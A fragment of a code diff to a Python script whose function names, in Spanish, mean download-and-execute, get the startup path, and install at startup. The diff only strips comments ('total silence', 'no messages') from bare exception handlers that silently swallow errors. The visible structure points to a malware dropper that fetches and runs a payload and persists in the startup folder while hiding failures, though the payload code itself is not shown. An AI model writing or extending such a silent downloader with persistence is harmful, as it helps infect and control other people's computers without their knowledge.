@@ -34,7 +34,7 @@ def descargar_y_ejecutar():
         )
 
     except:
-        pass  # total silencio
+        pass
 
 
 def obtener_ruta_startup():
@@ -64,7 +64,7 @@ def instalar_en_inicio():
                         f.write(chunk)
 
     except:
-        pass  # sin mensajes
+        pass
 
 
 if __name__ == "__main__":
